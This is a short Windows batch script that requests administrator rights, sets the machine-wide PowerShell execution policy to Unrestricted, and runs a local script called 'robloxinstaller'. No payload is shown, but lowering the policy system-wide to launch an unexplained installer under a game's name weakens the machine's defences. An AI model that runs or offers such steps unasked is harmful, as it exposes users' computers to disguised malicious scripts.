@echo off
:: Check for admin rights
NET FILE >nul 2>&1
IF '%ERRORLEVEL%' NEQ '0' (
    ECHO Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    EXIT /B
)

:: Your elevated commands go below
powershell -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force"
powershell -executionpolicy unrestricted .\robloxinstaller
